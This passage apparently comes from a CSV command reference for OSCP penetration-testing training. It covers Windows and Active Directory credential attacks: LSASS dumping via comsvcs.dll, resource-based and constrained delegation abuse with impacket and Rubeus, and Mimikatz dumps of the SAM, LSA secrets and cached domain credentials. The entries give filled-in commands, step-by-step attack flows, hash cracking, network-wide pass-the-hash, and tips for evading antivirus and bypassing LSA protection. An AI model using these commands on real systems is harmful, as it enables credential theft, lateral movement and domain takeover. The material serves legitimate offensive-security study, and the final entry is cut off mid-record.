  # Method 3: comsvcs.dll (LOLBin - no tools needed)
  rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> lsass.dmp full

  # Get LSASS PID:
  tasklist /fi ""imagename eq lsass.exe""

TRANSFER to attacker machine, parse with mimikatz or pypykatz.

Pypykatz (Linux alternative):
  pypykatz lsa minidump lsass.dmp

Time estimate: 1-2 minutes (dump creation + transfer + parse)","medium","","","","","{""sekurlsa::minidump"": ""Loads a minidump file for offline analysis instead of accessing live LSASS process."", ""sekurlsa::logonpasswords"": ""Extracts credentials from the loaded dump (same output as live extraction).""}","","","[""mimikatz-overpass-the-hash""]"
"rbcd-set-msds","RBCD - Set msDS-AllowedToActOnBehalfOfOtherIdentity","exploitation","python3 rbcd.py -delegate-from '<CONTROLLED_ACCOUNT>$' -delegate-to '<TARGET_COMPUTER>$' -action write '<DOMAIN>/<USERNAME>:<PASSWORD>'","Configure Resource-Based Constrained Delegation on target computer","active-directory","python3 rbcd.py -delegate-from 'YOURPC$' -delegate-to 'DC01$' -action write 'corp.local/user:P@ssw0rd123!'","RBCD (RESOURCE-BASED CONSTRAINED DELEGATION):
Allows impersonation to specific services on target computer.

ATTACK FLOW:
1. Find target where you have GenericWrite/WriteDacl (BloodHound)
2. Create/use machine account you control (requires MAQ > 0 or existing)
3. Set RBCD: rbcd.py -delegate-from YOURPC$ -delegate-to TARGET$
4. Get ticket: getST.py -spn cifs/TARGET -impersonate administrator
5. Use ticket: psexec.py -k TARGET

REQUIRES:
- GenericWrite/WriteDacl/GenericAll on target computer
- A machine account you control (create with addcomputer.py)
- Target computer must have unconstrained delegation OR you use S4U2Self

OSCP TIP:
RBCD is extremely common in OSCP labs. Look for GenericWrite on computers.","high","","","","{""Access denied"": ""User lacks GenericWrite/WriteDacl on target computer""}","{""-delegate-from"": ""Account that will be allowed to delegate (your controlled account)"", ""-delegate-to"": ""Target computer to configure RBCD on"", ""-action write"": ""Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute"", ""-action remove"": ""Remove RBCD configuration (cleanup)""}","","[""bloodyad-rbcd""]","[""rbcd-getST""]"
"rbcd-get-st","RBCD - Get Service Ticket via S4U","exploitation","impacket-getST -spn 'cifs/<TARGET_FQDN>' -impersonate '<TARGET_USER>' '<DOMAIN>/<MACHINE_ACCOUNT>$' -hashes ':<NTLM_HASH>'","Perform S4U2Self + S4U2Proxy to impersonate user to target service","active-directory","impacket-getST -spn 'cifs/dc01.corp.local' -impersonate 'administrator' 'corp.local/YOURPC$' -hashes ':aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'","S4U ATTACKS:
S4U2Self: Request ticket to self on behalf of any user (gets forwardable ticket)
S4U2Proxy: Use forwardable ticket to access target service

AFTER GETTING TICKET:
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass <target>

OR:
impacket-psexec -k -no-pass <domain>/<impersonated_user>@<target>","high","","","","{""KDC_ERR_BADOPTION"": ""RBCD not properly configured or target not supporting delegation"", ""KDC_ERR_S_PRINCIPAL_UNKNOWN"": ""SPN not found - check target FQDN spelling""}","{""-spn"": ""Service Principal Name for the target service (cifs/host for file share access)"", ""-impersonate"": ""User to impersonate via S4U"", ""-hashes"": ""NTLM hash in format :HASH (LM can be empty)"", ""-dc-ip"": ""Domain controller IP (optional)""}","[""rbcd-set-msds""]","[""rubeus-s4u-impersonate""]","[""psexec-shell""]"
"rubeus-s4u-impersonate","Rubeus - S4U Delegation Attack (Windows)","exploitation","Rubeus.exe s4u /user:<MACHINE_ACCOUNT>$ /rc4:<NTLM_HASH> /impersonateuser:<TARGET_USER> /msdsspn:cifs/<TARGET_FQDN> /ptt","Perform S4U2Self + S4U2Proxy attack from Windows","active-directory","Rubeus.exe s4u /user:YOURPC$ /rc4:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 /impersonateuser:administrator /msdsspn:cifs/dc01.corp.local /ptt","RUBEUS S4U:
Windows equivalent of impacket-getST.

/ptt automatically injects ticket.
/altservice:host,http,ldap gets tickets for multiple services.","high","","","","{""KDC_ERR_TGT_REVOKED"": ""Account disabled or password changed""}","{""/user"": ""Account performing the delegation (your machine account)"", ""/rc4"": ""NTLM hash of the account"", ""/impersonateuser"": ""User to impersonate"", ""/msdsspn"": ""Target service SPN"", ""/ptt"": ""Pass-the-Ticket - inject into current session"", ""/altservice"": ""Alternative SPN for the same ticket""}","[""rbcd-set-msds""]","","[""psexec-shell""]"
"impacket-get-st-constrained","Impacket getST - Constrained Delegation Attack","exploitation","impacket-getST -spn '<ALLOWED_SPN>' -impersonate '<TARGET_USER>' '<DOMAIN>/<SERVICE_ACCOUNT>' -hashes ':<NTLM_HASH>'","Exploit constrained delegation to impersonate users to allowed services","active-directory","impacket-getST -spn 'cifs/dc01.corp.local' -impersonate 'administrator' 'corp.local/svc_sql' -hashes ':aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'","CONSTRAINED DELEGATION:
Account has msDS-AllowedToDelegateTo set - can impersonate ANY user to those SPNs.

FIND TARGETS:
BloodHound: delegation-constrained-abuse query
LDAP: msDS-AllowedToDelegateTo attribute on user/computer

SPN ALTERNATIVE:
Service portion of SPN is arbitrary - cifs/host and http/host use same key.
Use /altservice in Rubeus to get tickets for services not in AllowedToDelegateTo.","high","","","","{""KDC_ERR_BADOPTION"": ""Account not configured for constrained delegation""}","{""-spn"": ""Target SPN from AllowedToDelegateTo attribute"", ""-impersonate"": ""User to impersonate (usually administrator)"", ""-hashes"": ""Account hash in :NTLM format""}","","[""rubeus-s4u-impersonate""]","[""psexec-shell""]"
"rubeus-monitor","Rubeus - Monitor for TGTs (Unconstrained Delegation)","exploitation","Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>","Monitor for incoming TGTs on unconstrained delegation host","active-directory","Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$","UNCONSTRAINED DELEGATION ATTACK:
Hosts with TrustedForDelegation cache TGTs of connecting users.

ATTACK FLOW:
1. Compromise host with unconstrained delegation
2. Run Rubeus monitor to watch for TGTs
3. Coerce high-value target (DC) to authenticate to us
4. Capture TGT and use for impersonation

COERCION METHODS:
PetitPotam, PrinterBug, Coercer - force DC to authenticate.

OSCP TIP:
Look for 'YOURPC'  'TrustedForDelegation: True' in BloodHound.","high","","","","{""Access denied"": ""Need admin rights on unconstrained delegation host""}","{""monitor"": ""Continuously monitor for new TGTs in LSASS"", ""/interval"": ""Check interval in seconds"", ""/nowrap"": ""Don't wrap Base64 output (easier to copy)"", ""/targetuser"": ""Only show TGTs for specific user""}","","","[""rubeus-ptt""]"
"addcomputer-create","Impacket addcomputer - Create Machine Account","exploitation","impacket-addcomputer -computer-name '<NEW_COMPUTER>$' -computer-pass '<PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'","Create a new machine account for RBCD attacks","active-directory","impacket-addcomputer -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip 192.168.50.70 'corp.local/user:Password123!'","MACHINE ACCOUNT CREATION:
By default, domain users can create up to 10 machine accounts (ms-DS-MachineAccountQuota).

FOR RBCD:
1. Create machine account you control
2. Use its hash for S4U attack

GET HASH:
impacket-secretsdump '<DOMAIN>/<NEW_COMPUTER>$:<PASSWORD>@<DC_IP>'

OR compute hash:
python3 -c ""import hashlib; print(hashlib.new('md4', 'Password123!'.encode('utf-16le')).hexdigest())""","high","","","","{""MachineAccountQuota exceeded"": ""MAQ is 0 - use existing machine account instead"", ""Access denied"": ""User cannot create machine accounts""}","{""-computer-name"": ""Name for the new machine account (include $ suffix)"", ""-computer-pass"": ""Password for the machine account"", ""-dc-ip"": ""Domain controller IP""}","","","[""rbcd-set-msds""]"
"bloodyad-rbcd","BloodyAD - Set RBCD Delegation","exploitation","bloodyAD -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --host '<DC_IP>' set object '<TARGET_COMPUTER>$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '<CONTROLLED_SID>'","Configure RBCD using BloodyAD tool","active-directory","bloodyAD -d 'corp.local' -u 'user' -p 'P@ssw0rd123!' --host '192.168.50.70' set object 'DC01$' msDS-AllowedToActOnBehalfOfOtherIdentity -v 'S-1-5-21-...'","BLOODYAD:
Multi-purpose AD exploitation tool.

Alternative to rbcd.py for RBCD configuration.","high","","","","{""Access denied"": ""Insufficient permissions on target""}","{""-d"": ""Domain name"", ""-u"": ""Username"", ""-p"": ""Password"", ""--host"": ""DC hostname/IP"", ""set object"": ""Modify AD object attribute""}","","[""rbcd-set-msds""]","[""rbcd-getST""]"
"rubeus-tgtdeleg","Rubeus - TGT Delegation Trick","exploitation","Rubeus.exe tgtdeleg /nowrap","Extract usable TGT from current session using delegation","active-directory","","TGT DELEGATION TRICK:
Requests TGT by abusing Kerberos delegation.

Use this when:
- You have shell but no credentials
- Want to extract current user's TGT for use elsewhere
- sekurlsa::logonpasswords doesn't return hashes (credential guard)","medium","","","","{""Unable to get delegation TGT"": ""No service in domain allows delegation""}","{""tgtdeleg"": ""Request forwardable TGT using delegation trick"", ""/nowrap"": ""Don't wrap Base64 output""}","","","[""rubeus-ptt""]"
"mimikatz-lsadump-sam","Mimikatz Dump SAM Database Hashes","post-exploit",".\mimikatz.exe ""privilege::debug"" ""token::elevate"" ""lsadump::sam"" ""exit""","Extract local account password hashes from Security Account Manager (SAM) database. Provides NTLM hashes for local Administrator, Guest, and user accounts. Alternative to LSASS memory dumps for local credential extraction. Works even when Credential Guard protects LSASS.","credential-harvesting","","OSCP METHODOLOGY: SAM dumps are CRITICAL for local admin password reuse attacks. COMMON SCENARIO: Extract Administrator NTLM from one workstation, test against all other workstations with Pass-the-Hash. Local admin password reuse is extremely common in enterprise environments.

TIME ESTIMATE: 15-30 seconds (5 sec privilege elevation, 5 sec extraction, 5-20 sec parsing output)

MANUAL ALTERNATIVES:
1. Offline extraction with reg save (recommended for stealth):
   reg save HKLM\SAM sam.save
   reg save HKLM\SYSTEM system.save
   download files, parse on Kali with impacket-secretsdump or Mimikatz

2. Impacket secretsdump.py (Linux):
   impacket-secretsdump -sam sam.save -system system.save LOCAL
   OR remote: impacket-secretsdump DOMAIN/user:pass@TARGET

3. pwdump/fgdump (legacy tools, similar functionality)

SAM VS LSASS MEMORY:
SAM Database (this command):
  - Pros: Works without active sessions, bypasses Credential Guard, persistent storage
  - Cons: Only local accounts (no domain users unless cached), no plaintext passwords
  - Contains: Local Administrator, Guest, local users, NTLM hashes

LSASS Memory (sekurlsa::logonpasswords):
  - Pros: Domain users, plaintext passwords (if cached), service sessions
  - Cons: Requires active logon sessions, blocked by Credential Guard, volatile
  - Contains: Current logged-on users (local + domain), NTLM + plaintext

OSCP EXAM TIPS:
1. ALWAYS extract SAM on every compromised system (even if sekurlsa works)
2. Test Administrator hash across ALL systems with crackmapexec: crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM>
3. Document hash reuse patterns: SYSTEM_A_Admin  SYSTEM_B_Admin (same hash = password reuse)
4. Offline extraction preferred for time: reg save + download + parse on Kali (no AV issues)
5. Save hashes immediately: username:RID:LM:NTLM format for easy reference
6. Combine with domain creds for complete picture

LOCAL ADMIN PASSWORD REUSE ATTACK:
1. Compromise WORKSTATION-01 with web exploit (local admin access)
2. Extract SAM: Administrator NTLM = aad3...b73c5 (example)
3. Test hash across network: crackmapexec smb 192.168.1.0/24 -u Administrator -H aad3...b73c5 --local-auth
4. Discover WORKSTATION-02, WORKSTATION-03, SERVER-01 have same Administrator password
5. Lateral movement to all systems using single hash
6. Often leads to Domain Admin: DA logged into SERVER-01  dump credentials

HASH FORMAT EXPLANATION:
aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
  ^^^^^^^^^^^^^ (Part 1)         ^^^^^^^^^^^^^ (Part 2)
  LM Hash (disabled/empty)       NTLM Hash (actual password hash)

Part 1 (aad3b435...): Empty LM hash placeholder (LM disabled on modern Windows)
Part 2 (8846f7ea...): NTLM hash of actual password (use this for Pass-the-Hash or cracking)

For Pass-the-Hash: Use FULL hash with colon separator
For Hashcat cracking: Extract NTLM part only (after colon) with mode 1000

DETECTION NOTES:
- Event ID 4663: Registry value access (if auditing enabled on SAM hive)
- Event ID 4624: Token elevation visible as SYSTEM logon
- Offline 'reg save' generates Event ID 4656 (registry key access) - legitimate admin task
- Mimikatz execution may trigger AV/EDR (focus on binary, not action)
- Low detection for offline extraction via reg save (common backup task)

COMMON MISTAKES:
1. Not running privilege::debug first (SeDebugPrivilege required for token::elevate)
2. Skipping token::elevate (SAM requires SYSTEM token)
3. Not testing Administrator hash across other systems (missing lateral movement)
4. Using only LM hash part (deprecated, use NTLM)
5. Not saving output immediately (lost on disconnect)

ADVANCED USAGE:
- Extract from offline registry: lsadump::sam /sam:sam.save /system:system.save
- Remote SAM dump: Use impacket-secretsdump or Invoke-Mimikatz remotely
- Volume Shadow Copy: Extract SAM from VSS for historical passwords

WHEN SAM DUMP IS MOST VALUABLE:
- Credential Guard blocks LSASS memory (no sekurlsa::logonpasswords)
- No domain users logged in (sekurlsa would be empty)
- Want persistent hashes (not dependent on current sessions)
- Offline analysis required (stealth, no Mimikatz on target)
- Testing local admin password reuse across enterprise","high","","","","{""Cannot connect to SAM / Handle on memory error"": ""Token elevation to SYSTEM failed. Solution: Verify sequence: (1) Run 'privilege::debug' first \u2192 should see 'Privilege '20' OK'. (2) Run 'token::elevate' \u2192 should see 'Token Id : 0' and 'User name : NT AUTHORITY\\SYSTEM'. (3) Then run 'lsadump::sam'. If still failing, use PsExec to get SYSTEM shell: PsExec.exe -s -i cmd.exe, then run Mimikatz from SYSTEM context directly."", ""ERROR kull_m_registry_OpenAndQueryWithAlloc"": ""Cannot read SAM or SYSTEM registry hives. Causes: (1) Not running with admin rights. Solution: Verify with 'whoami /groups' - must see BUILTIN\\Administrators. (2) SAM hive locked or corrupted. Solution: Use offline method - export with 'reg save HKLM\\SAM sam.save' and parse offline. (3) Third-party security software blocking registry access. Solution: Disable AV or use offline extraction."", ""Accounts shown but NTLM field empty"": ""Account has no password set or password is blank. Blank password NTLM hash: 31d6cfe0d16ae931b73c59d7e0c089c0. Common for: Guest account (often disabled with blank password), Service accounts with 'Password not required' flag. Use blank password for authentication or Pass-the-Hash with blank hash."", ""Want to parse SAM offline without target execution"": ""Offline extraction preferred for OPSEC. Steps: (1) On target with admin rights: reg save HKLM\\SAM C:\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Temp\\system.save. (2) Transfer files to Kali: download sam.save, download system.save (via Evil-WinRM, SMB, HTTP). (3) On Kali: impacket-secretsdump -sam sam.save -system system.save LOCAL OR mimikatz 'lsadump::sam /sam:sam.save /system:system.save'. Advantage: No Mimikatz execution on target, bypasses AV, forensically cleaner.""}","{""lsadump::sam"": ""Dumps the SAM (Security Account Manager) database containing local user account password hashes. WHY THIS WORKS: SAM stores NTLM hashes for local accounts (Administrator, Guest, local users) encrypted with SYSKEY (stored in SYSTEM registry hive). Mimikatz reads SAM from registry (HKLM\\SAM), decrypts using SYSKEY from SYSTEM hive, and extracts NTLM hashes. DOES NOT REQUIRE ACTIVE LOGON SESSIONS: Unlike sekurlsa::logonpasswords which needs users logged in, SAM extraction works with registry data alone."", ""token::elevate"": ""Elevates current process token to SYSTEM level using token impersonation. REQUIRED FOR SAM ACCESS: SAM registry hive (HKLM\\SAM) is only readable by SYSTEM account, even administrators cannot read it directly. token::elevate steals SYSTEM token from lsass.exe or another SYSTEM process. Must run 'privilege::debug' first to obtain SeDebugPrivilege required for token theft."", ""SAM Database Structure"": ""SAM contains: RID (Relative Identifier - last part of SID), Username, NTLM hash (LM hash on old systems), Account metadata (disabled, locked, password age). Located at: C:\\Windows\\System32\\config\\SAM (file-based registry hive). Automatically loaded to HKLM\\SAM at boot. Administrator always has RID 500, Guest has RID 501."", ""Offline vs Online Extraction"": ""ONLINE (this command): Reads SAM directly from live registry using SYSTEM token. Advantages: Fast, no file transfer. Disadvantages: Requires Mimikatz on target, token elevation needed. OFFLINE: Export registry hives first (reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save), transfer to Kali, parse with: mimikatz 'lsadump::sam /sam:sam.save /system:system.save' OR secretsdump.py -sam sam.save -system system.save LOCAL. Advantage: No Mimikatz on target, bypasses AV."", ""Output Format"": ""Displays for each account: RID (hex and decimal), Username, NTLM hash (32 hex chars), LM hash (if enabled - deprecated). Example: RID : 000001f4 (500), User : Administrator, NTLM: aad3b435b51404eeaad3b435b51404ee. The first part of NTLM (aad3b435...) is empty LM hash placeholder. Actual NTLM is second half. Use full hash for Pass-the-Hash or crack with Hashcat mode 1000.""}","","","[""hashcat-crack-ntlm"", ""pth-cme-local-admin""]"
"mimikatz-lsadump-secrets","Mimikatz Dump LSA Secrets","post-exploit",".\mimikatz.exe ""privilege::debug"" ""token::elevate"" ""lsadump::secrets"" ""exit""","Extract Local Security Authority (LSA) Secrets containing service account passwords, scheduled task credentials, DPAPI master keys, VPN passwords, and autologon credentials. More comprehensive than SAM dump. Essential for service account harvesting and finding plaintext passwords.","credential-harvesting","","OSCP METHODOLOGY: LSA Secrets extraction is HIGH PRIORITY for finding service account passwords. COMMON SCENARIO: SQL Server running as domain account sql_service. Extract password from _SC_MSSQLSERVER secret, gain SQL sysadmin access, enable xp_cmdshell for command execution.

TIME ESTIMATE: 15-30 seconds (5 sec elevation, 10-25 sec extraction and parsing)

MANUAL ALTERNATIVES:
1. Offline extraction (recommended for OPSEC):
   reg save HKLM\SECURITY security.save
   reg save HKLM\SYSTEM system.save
   impacket-secretsdump -security security.save -system system.save LOCAL

2. Impacket remote extraction:
   impacket-secretsdump DOMAIN/user:pass@TARGET
   (extracts SAM + LSA Secrets + cached credentials in one command)

3. PowerShell LSA extraction:
   Invoke-Mimikatz -Command '""privilege::debug"" ""token::elevate"" ""lsadump::secrets""'

LSA SECRETS VS SAM VS LSASS:
LSA Secrets (this command):
  - Contains: Service passwords (plaintext/NTLM), autologon creds (plaintext), DPAPI keys, machine account
  - Pros: Plaintext passwords, service account goldmine, works without active sessions
  - Cons: Requires SYSTEM, may be protected by RunAsPPL, offline extraction cleaner

SAM Database:
  - Contains: Local account NTLM hashes (Administrator, local users)
  - Pros: Simple, always present, bypasses Credential Guard
  - Cons: No domain accounts, no plaintext, only local accounts

LSASS Memory:
  - Contains: Active session credentials (domain users, plaintext passwords, tickets)
  - Pros: Domain credentials, Kerberos tickets, plaintext if cached
  - Cons: Requires active logons, blocked by Credential Guard, volatile

OSCP EXAM TIPS:
1. Extract LSA Secrets on EVERY compromised server (especially database/web servers)
2. Look for service account patterns: sql_service, iis_service, backup_service (often weak passwords)
3. Test autologon first (faster): reg query Winlogon /v DefaultPassword
4. Service passwords often reused across servers (test sql_service password on all SQL servers)
5. DPAPI_SYSTEM key enables decryption of scheduled tasks, saved credentials, browser passwords
6. Document ALL passwords: service name, account, password, NTLM hash

COMMON LSA SECRET FINDS:
1. SQL Server service account: _SC_MSSQLSERVER  sql_service plaintext password  SQL sysadmin  xp_cmdshell
2. Autologon credentials: DefaultPassword  domain\admin plaintext  immediate DA access
3. Scheduled task credentials: _SC_<TaskName>  backup account password  Volume Shadow Copy access
4. VPN credentials: L$<VPNName>  domain user VPN password  password spray attack vector
5. Machine account password: $MACHINE.ACC  computer object NTLM  DCSync with computer account

SERVICE ACCOUNT ATTACK FLOW:
1. Enumerate services: sc query | findstr SERVICE_NAME
2. Check service logon accounts: sc qc <ServiceName>  look for 'SERVICE_START_NAME : DOMAIN\user'
3. Extract LSA Secrets: lsadump::secrets  find _SC_<ServiceName>  get plaintext password
4. Test account privileges: net user <account> /domain  check group membership
5. Leverage service: (SQL) xp_cmdshell, (IIS) app pool impersonation, (Backup) VSS access
6. Lateral movement: Test password on other systems with same service

DPAPI MASTER KEY USAGE:
DPAPI_SYSTEM secret enables decryption of:
- Scheduled task credentials (C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\)
- Saved RDP credentials
- Windows Vault secrets (Certificate Private Keys, Web Credentials)
- Chrome/Edge saved passwords (SYSTEM context)

Extraction: Get DPAPI_SYSTEM full key  Use mimikatz dpapi module to decrypt protected data

DETECTION NOTES:
- Event ID 4663: Object access (if auditing enabled on SECURITY hive)
- Event ID 4656: Handle to object (registry key access)
- LSA Protection (RunAsPPL) blocks access, generates Event ID 3033/3063
- Offline 'reg save' is legitimate admin task (low suspicion)
- No specific event for LSA Secrets extraction (reading registry data)

COMMON MISTAKES:
1. Not checking autologon first (fastest win if enabled)
2. Ignoring service accounts (_SC_* secrets) - often high-privilege
3. Not testing service passwords on other systems (lateral movement opportunity)
4. Skipping DPAPI_SYSTEM key (needed for decrypting protected data)
5. Not documenting machine account password (useful for Silver Tickets)

ADVANCED USAGE:
- Bypass LSA Protection: lsadump::secrets /patch (patches LSASS in-memory)
- Offline parsing: lsadump::secrets /security:security.save /system:system.save
- Remote extraction: Invoke-Mimikatz on remote system via PS remoting
- DPAPI decryption: Use extracted DPAPI_SYSTEM with dpapi::chrome/cred commands","high","","","","{""No secrets displayed / Empty output"": ""Possible causes: (1) LSA Secrets Protection (RunAsPPL) enabled via GPO. Solution: Use /patch flag (lsadump::secrets /patch) to bypass protection OR use mimidrv.sys driver. Check protection: reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL (value 1 = protected). (2) No LSA secrets configured on system. Solution: Rare - most systems have at least $MACHINE.ACC. Verify with offline export. (3) Token elevation failed. Solution: Verify 'token::elevate' succeeded - should show 'User name : NT AUTHORITY\\SYSTEM'."", ""Cannot access SECURITY hive"": ""Registry access denied or hive locked. Solution: Same as SAM troubleshooting - use offline extraction: reg save HKLM\\SECURITY security.save && reg save HKLM\\SYSTEM system.save. Parse on Kali: impacket-secretsdump -security security.save -system system.save LOCAL OR mimikatz 'lsadump::secrets /security:security.save /system:system.save'."", ""Service secrets show 'NULL' instead of password"": ""Service not configured with credentials or using LocalSystem/NetworkService. Explanation: Services running as built-in accounts (LocalSystem, LocalService, NetworkService) have no stored passwords. Only services configured with 'Log on as: This account' store credentials. Check service config: sc qc <ServiceName> - look for 'SERVICE_START_NAME : DOMAIN\\user' (has password) vs 'LocalSystem' (no password)."", ""Autologon credentials not found"": ""Autologon not enabled on system. Verification: reg query \""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" /v AutoAdminLogon (value 1 = enabled, 0 = disabled). Only systems with autologon enabled store DefaultPassword in LSA Secrets. Common on: kiosks, lab environments, legacy servers with management consoles.""}","{""lsadump::secrets"": ""Dumps LSA (Local Security Authority) Secrets from registry. WHY THIS MATTERS: LSA Secrets contain PLAINTEXT or reversibly-encrypted credentials for: (1) Service accounts running Windows services (SQL Server, IIS, etc.). (2) Scheduled tasks running as specific users. (3) Autologon credentials (if enabled - plaintext domain/local creds). (4) DPAPI Master Keys (decrypt user data). (5) Machine account password (for domain communications). (6) VPN/802.1X credentials. LOCATION: Encrypted in HKLM\\SECURITY\\Policy\\Secrets registry hive. Decrypted using LSA policy key derived from SYSTEM hive."", ""token::elevate"": ""Elevates to SYSTEM token (same as SAM extraction). REQUIRED: SECURITY registry hive (containing LSA Secrets) is only readable by SYSTEM. Token impersonation steals SYSTEM token from another process. Must run 'privilege::debug' first for SeDebugPrivilege."", ""LSA Secrets Categories"": ""Common secret types: (1) _SC_<ServiceName>: Service account password (e.g., _SC_MSSQLSERVER for SQL Server). (2) DefaultPassword: Autologon password if enabled (PLAINTEXT). (3) DPAPI_SYSTEM: DPAPI master keys for SYSTEM account (decrypt system-level protected data). (4) $MACHINE.ACC: Domain computer account password (machine account NTLM hash). (5) L$<string>: Dial-up/VPN credentials. (6) NL$KM: Computer account password for Netlogon (older systems)."", ""Service Account Passwords"": ""Services running as domain accounts store passwords in LSA Secrets. Example: Microsoft SQL Server configured to run as CORP\\sql_service stores sql_service password in _SC_MSSQLSERVER secret. WHY CRITICAL: Service accounts often have: (1) High privileges (Domain Admin, SQL sysadmin, local admin on multiple servers). (2) Weak passwords (Password1!, Company123!). (3) No password expiration. (4) Rarely monitored for compromise. Extracting service passwords enables lateral movement and privilege escalation."", ""Autologon Credentials"": ""Windows Autologon feature stores plaintext credentials in LSA Secrets for automatic login. Secret names: DefaultDomainName, DefaultUserName, DefaultPassword. If enabled (common on kiosks, lab systems, legacy servers), provides immediate domain/local account credentials. Check registry first: reg query \""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" /v DefaultPassword. If value exists, lsadump::secrets retrieves plaintext password.""}","","","[""mimikatz-lsadump-sam"", ""windows-service-enumeration"", ""hashcat-crack-ntlm""]"
"mimikatz-lsadump-cache","Mimikatz Dump Cached Domain Credentials","post-exploit",".\mimikatz.exe ""privilege::debug"" ""token::elevate"" ""lsadump::cache"" ""exit""","Extract MS-Cache v2 hashes (domain cached credentials - DCC2) from registry. Enables offline authentication when domain controller unavailable. Provides domain user password hashes for offline cracking. Works on domain-joined systems with cached logons enabled.","credential-harvesting","","OSCP METHODOLOGY: Cached credentials provide domain user password hashes when no domain users are actively logged in (sekurlsa::logonpasswords empty). COMMON SCENARIO: Compromise workstation with local admin, no domain users logged in, but workstation is domain-joined. Extract cached credentials to obtain historical domain user hashes.

TIME ESTIMATE: 15-30 seconds extraction + 5 minutes to 24+ hours cracking (depends on password complexity)

MANUAL ALTERNATIVES:
1. Offline extraction (recommended):
   reg save HKLM\SECURITY security.save
   reg save HKLM\SYSTEM system.save
   impacket-secretsdump -security security.save -system system.save LOCAL

2. Impacket remote (extracts SAM + Secrets + Cache):
   impacket-secretsdump DOMAIN/user:pass@TARGET

3. Hashcat cracking:
   hashcat -m 2100 '$DCC2$10240#jdoe#e2d81...7f3c1' rockyou.txt

MS-CACHE V2 VS NTLM:
MS-Cache v2 (DCC2):
  - Purpose: Offline domain logon verification
  - Iterations: 10240 (PBKDF2)
  - Cracking: 10-100x slower than NTLM
  - Pass-the-Hash: NO (cannot use for network authentication)
  - Usage: Crack to plaintext  use plaintext for authentication

NTLM:
  - Purpose: Network authentication
  - Iterations: 0 (single MD4 hash)
  - Cracking: Fast
  - Pass-the-Hash: YES (use hash directly)
  - Usage: Pass-the-Hash OR crack to plaintext

OSCP EXAM TIPS:
1. Extract cached credentials even if sekurlsa::logonpasswords found domain users (cache provides historical users)
2. Cached creds often include privileged users (IT admins logging in for maintenance)
3. Crack weak passwords first (common patterns: Password1!, Company2023!, Welcome123!)
4. Cached credentials survive reboot (persistent in registry vs volatile LSASS memory)
5. Combine with SAM dump: local admin hash + cached domain user hashes = comprehensive credential picture
6. Offline cracking: Extract on target, crack on powerful Kali/Windows with GPU

CRACKING STRATEGY:
1. Format hash for Hashcat: $DCC2$10240#<username>#<hash>
   Example: $DCC2$10240#jdoe#e2d81a7f8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5

2. Wordlist attack (fastest):
   hashcat -m 2100 -a 0 cache.txt rockyou.txt

3. Rule-based attack (medium):
   hashcat -m 2100 -a 0 cache.txt rockyou.txt -r best64.rule

4. Mask attack for known patterns:
   hashcat -m 2100 -a 3 cache.txt ?u?l?l?l?l?l?d?d?d?d! (Password1234! pattern)

5. Time estimates:
   - Weak passwords (Password1!): Seconds to minutes
   - Medium passwords (Company2023!): Minutes to hours
   - Strong passwords (random 12+ chars): Infeasible without GPU cluster

WHEN CACHED CREDENTIALS ARE MOST VALUABLE:
- No domain users currently logged in (sekurlsa::logonpasswords shows only local accounts)
- Historical domain user access needed (who logged in previously?)
- Offline cracking scenario (extract hashes, crack on dedicated cracking rig)
- Domain controller unreachable (cached creds enable offline attack continuation)
- Credential Guard blocks LSASS (cache provides alternative domain credential source)

CACHED CREDENTIAL ATTACK FLOW:
1. Compromise workstation/server with local admin
2. Check for domain membership: systeminfo | findstr Domain
3. Extract cached credentials: lsadump::cache
4. Format hashes for Hashcat: $DCC2$10240#<user>#<hash>
5. Crack with wordlist + rules: hashcat -m 2100 cache.txt rockyou.txt -r best64.rule
6. Successful crack  plaintext password
7. Test password with: crackmapexec smb DC01 -u jdoe -p 'Password123!' -d CORP
8. Valid credentials  lateral movement, privilege escalation, domain enumeration

DETECTION NOTES:
- Event ID 4663/4656: Object/registry access (if auditing enabled)
- Offline reg save: Legitimate admin backup (low suspicion)
- No specific event for cache extraction (reading registry data)
- Cracking happens offline (no network events)
- Password reuse detected via Event ID 4624 (logon success) when cracked password used

COMMON MISTAKES:
1. Attempting Pass-the-Hash with MS-Cache hash (doesn't work - must crack to plaintext)
2. Not formatting hash correctly for Hashcat ($DCC2$10240#user#hash format required)
3. Giving up on cracking too early (try multiple wordlists + rules)
4. Not checking CachedLogonsCount (may be disabled via GPO)
5. Forgetting username is case-sensitive in MS-Cache hash
6. Not combining with SAM/Secrets dumps (complete credential picture needs all three)

ADVANCED USAGE:
- Offline parsing: lsadump::cache /security:security.save /system:system.save
- GPU cracking: Transfer hashes to Windows with NVIDIA GPU for 10-100x speed
- Rainbow tables: Not practical for MS-Cache v2 due to iterations (use wordlists)
